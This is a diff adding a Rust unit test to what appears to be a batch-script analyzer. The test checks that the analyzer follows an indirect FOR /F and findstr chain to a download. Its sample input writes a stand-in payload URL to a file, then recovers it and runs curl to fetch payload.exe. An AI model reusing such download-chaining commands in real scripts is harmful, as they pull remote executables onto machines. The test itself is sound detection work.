@@ -3847,6 +3847,29 @@ for /f "tokens=* delims=" %%F in ('dir /s /b C:\Work\*.txt') do for /f "tokens=*
     }
 
     #[test]
+    fn for_f_findstr_m_wildcard_discovers_matching_generated_file_source() {
+        let report = analyze(
+            br#"echo noise>noise.txt
+echo https://for-f-findstr-m-wildcard.example/payload.exe>url.txt
+for /f "tokens=* delims=" %%F in ('findstr /m /c:"https://" *.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-m-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /m wildcard source did not discover matching generated file for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_cmd_c_type_reads_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-cmd-c-type.example/payload.exe>url.txt
